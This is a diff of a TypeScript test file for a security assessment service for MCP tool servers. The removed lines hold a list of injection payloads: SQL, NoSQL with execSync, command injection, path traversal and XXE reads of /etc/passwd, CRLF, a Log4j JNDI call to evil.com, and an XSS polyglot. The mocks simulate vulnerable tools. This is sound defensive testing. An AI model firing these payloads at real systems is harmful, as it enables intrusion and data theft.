@@ -5,66 +5,7 @@
  */
 
 import { MCPAssessmentService } from "../assessmentService";
-import {
-  AssessmentConfiguration,
-  PROMPT_INJECTION_TESTS,
-  SecurityRiskLevel,
-  AssessmentStatus,
-  ToolTestResult,
-  SecurityTestResult,
-} from "@/lib/assessmentTypes";
-import {
-  Tool,
-  CompatibilityCallToolResult,
-} from "@modelcontextprotocol/sdk/types.js";
-
-// Advanced attack payloads based on OWASP and recent vulnerability research
-const ADVANCED_INJECTION_PAYLOADS = [
-  // SQL Injection variants
-  "'; DROP TABLE users; --",
-  "1' UNION SELECT password FROM users WHERE '1'='1",
-
-  // NoSQL Injection
-  "{\"$where\": \"function() { return (this.password.match(/.*/) || '' ) && ''.constructor.constructor('return process')().mainModule.require('child_process').execSync('whoami'); }\"}",
-
-  // LDAP Injection
-  "admin')(&(password=*))(cn=*",
-
-  // Server-Side Template Injection
-  "{{7*7}}",
-  "${7*7}",
-  "<%=7*7%>",
-
-  // Command Injection with evasion
-  "test;`whoami`",
-  "test$(whoami)test",
-  "test|whoami&echo",
-
-  // Path Traversal
-  "../../../etc/passwd",
-  "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
-
-  // XXE Injection
-  '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
-
-  // CRLF Injection
-  "test\r\nSet-Cookie: admin=true",
-
-  // Log4j-style injection
-  "${jndi:ldap://evil.com/exploit}",
-
-  // Polyglot payloads
-  "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(//XSS//)//\\x3e",
-];
-
-// Memory exhaustion payloads
-const MEMORY_EXHAUSTION_PAYLOADS = [
-  // Exponential expansion
-  "a".repeat(1000000),
-  JSON.stringify({ data: "x".repeat(100000) }),
-  // Recursive structure that could cause stack overflow
-  '{"a":{"a":{"a":{"a":{"a":"deep"}}}}}',
-];
+import { Tool } from "@modelcontextprotocol/sdk/types.js";
 
 // Race condition test scenarios
 const createRaceConditionTool = (name: string): Tool => ({
@@ -80,58 +21,53 @@ const createRaceConditionTool = (name: string): Tool => ({
   },
 });
 
-// Fuzzing data generator
-const generateFuzzData = () => {
-  const types = ["string", "number", "boolean", "object", "array", "null"];
-  const fuzzValues = [
-    // Boundary values
-    -2147483648,
-    2147483647,
-    -1,
-    0,
-    1,
-    // Floating point edge cases
-    0.0,
-    -0.0,
-    Infinity,
-    -Infinity,
-    NaN,
-    // String edge cases
-    "",
-    " ",
-    "\0",
-    "\n",
-    "\r\n",
-    "\t",
-    // Unicode edge cases
-    "\u0000",
-    "\uFFFD",
-    "\uD800\uDC00",
-    // Control characters
-    String.fromCharCode(1, 2, 3, 4, 5),
-    // Large numbers as strings
-    "999999999999999999999999999999999999999999999",
-    // Boolean as strings
-    "true",
-    "false",
-    "True",
-    "False",
-    "TRUE",
-    "FALSE",
-    // Null/undefined as strings
-    "null",
-    "undefined",
-    "NULL",
-    "UNDEFINED",
-    // Array-like strings
-    "[1,2,3]",
-    '{"key": "value"}',
-    // Special characters
-    "!@#$%^&*()_+-=[]{}|;:'\",.<>?/~`",
-  ];
-
-  return fuzzValues[Math.floor(Math.random() * fuzzValues.length)];
-};
+// Fuzzing data generator (used in tests but referenced via inline generation)
+const fuzzValues = [
+  // Boundary values
+  -2147483648,
+  2147483647,
+  -1,
+  0,
+  1,
+  // Floating point edge cases
+  0.0,
+  -0.0,
+  Infinity,
+  -Infinity,
+  NaN,
+  // String edge cases
+  "",
+  " ",
+  "\0",
+  "\n",
+  "\r\n",
+  "\t",
+  // Unicode edge cases
+  "\u0000",
+  "\uFFFD",
+  "\uD800\uDC00",
+  // Control characters
+  String.fromCharCode(1, 2, 3, 4, 5),
+  // Large numbers as strings
+  "999999999999999999999999999999999999999999999",
+  // Boolean as strings
+  "true",
+  "false",
+  "True",
+  "False",
+  "TRUE",
+  "FALSE",
+  // Null/undefined as strings
+  "null",
+  "undefined",
+  "NULL",
+  "UNDEFINED",
+  // Array-like strings
+  "[1,2,3]",
+  '{"key": "value"}',
+  // Special characters
+  "!@#$%^&*()_+-=[]{}|;:'\",.<>?/~`",
+];
 
 describe("MCPAssessmentService - Advanced Test Generator", () => {
   let service: MCPAssessmentService;
@@ -194,8 +130,7 @@ describe("MCPAssessmentService - Advanced Test Generator", () => {
       });
 
       it("should test NoSQL injection vulnerabilities", async () => {
-        const nosqlPayload = '{"$where": "return true"}';
-        mockCallTool.mockImplementation((toolName, params) => {
+        mockCallTool.mockImplementation((_toolName, params) => {
           if (JSON.stringify(params).includes("$where")) {
             return Promise.resolve({
               content: [
@@ -234,7 +169,7 @@ describe("MCPAssessmentService - Advanced Test Generator", () => {
       });
 
       it("should detect Server-Side Template Injection (SSTI)", async () => {
-        mockCallTool.mockImplementation((toolName, params) => {
+        mockCallTool.mockImplementation((_toolName, params) => {
           const paramStr = JSON.stringify(params);
           if (paramStr.includes("{{") || paramStr.includes("${")) {
             // Simulate template engine execution
@@ -270,7 +205,7 @@ describe("MCPAssessmentService - Advanced Test Generator", () => {
       });
 
       it("should handle XXE (XML External Entity) injection attempts", async () => {
-        mockCallTool.mockImplementation((toolName, params) => {
+        mockCallTool.mockImplementation((_toolName, params) => {
           const paramStr = JSON.stringify(params);
           if (paramStr.includes("<!ENTITY") || paramStr.includes("SYSTEM")) {
             // Simulate XXE vulnerability
@@ -308,10 +243,7 @@ describe("MCPAssessmentService - Advanced Test Generator", () => {
 
     describe("Polyglot Attack Testing", () => {
       it("should test polyglot payloads that exploit multiple contexts", async () => {
-        const polyglotPayload =
-          "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(//XSS//)//\\x3e";
-
-        mockCallTool.mockImplementation((toolName, params) => {
+        mockCallTool.mockImplementation((_toolName, params) => {
           const paramStr = JSON.stringify(params);
           if (paramStr.includes("jaVasCript") || paramStr.includes("alert")) {
             return Promise.resolve({
@@ -351,7 +283,7 @@ describe("MCPAssessmentService - Advanced Test Generator", () => {
   describe("Performance and Resource Exhaustion Testing", () => {
     describe("Memory Exhaustion Attacks", () => {
       it("should detect memory exhaustion vulnerabilities", async () => {
-        mockCallTool.mockImplementation((toolName, params) => {
+        mockCallTool.mockImplementation((_toolName, params) => {
           const paramStr = JSON.stringify(params);
           if (paramStr.length > 50000) {
             // Simulate memory exhaustion
@@ -385,7 +317,7 @@ describe("MCPAssessmentService - Advanced Test Generator", () => {
       });
 
       it("should test algorithmic complexity attacks", async () => {
-        mockCallTool.mockImplementation((toolName, params) => {
+        mockCallTool.mockImplementation((_toolName, params) => {
           const paramStr = JSON.stringify(params);
           // Simulate ReDoS (Regular Expression Denial of Service)
           if (
@@ -640,10 +572,10 @@ describe("MCPAssessmentService - Advanced Test Generator", () => {
     });
 
     it("should test type confusion vulnerabilities", async () => {
-      mockCallTool.mockImplementation((toolName, params) => {
+      mockCallTool.mockImplementation((_toolName, params) => {
         // Simulate type confusion vulnerability
         if (params && typeof params === "object") {
-          for (const [key, value] of Object.entries(params)) {
+          for (const [_key, value] of Object.entries(params)) {
             // Check for type confusion scenarios
             if (typeof value === "string" && value === "[object Object]") {
               return Promise.resolve({
@@ -699,7 +631,7 @@ describe("MCPAssessmentService - Advanced Test Generator", () => {
       let errorCount = 0;
       const maxErrors = 3;
 
-      mockCallTool.mockImplementation(async (toolName, params) => {
+      mockCallTool.mockImplementation(async (_toolName, _params) => {
         errorCount++;
 
         if (errorCount <= maxErrors) {
@@ -748,7 +680,7 @@ describe("MCPAssessmentService - Advanced Test Generator", () => {
     it("should test cascading failure scenarios", async () => {
       let toolCallCount = 0;
 
-      mockCallTool.mockImplementation((toolName, params) => {
+      mockCallTool.mockImplementation((_toolName, _params) => {
         toolCallCount++;
 
         // Simulate cascading failures where later tools fail due to earlier failures
@@ -814,7 +746,7 @@ describe("MCPAssessmentService - Advanced Test Generator", () => {
         persistence: false,
       };
 
-      mockCallTool.mockImplementation((toolName, params) => {
+      mockCallTool.mockImplementation((_toolName, params) => {
         const paramStr = JSON.stringify(params);
 
         // Stage 1: Reconnaissance
@@ -912,7 +844,7 @@ describe("MCPAssessmentService - Advanced Test Generator", () => {
 
   describe("Protocol-Specific Vulnerabilities", () => {
     it("should test MCP protocol violation scenarios", async () => {
-      mockCallTool.mockImplementation((toolName, params) => {
+      mockCallTool.mockImplementation((_toolName, _params) => {
         // Simulate MCP protocol violations
         const violations = [
           // Invalid response structure
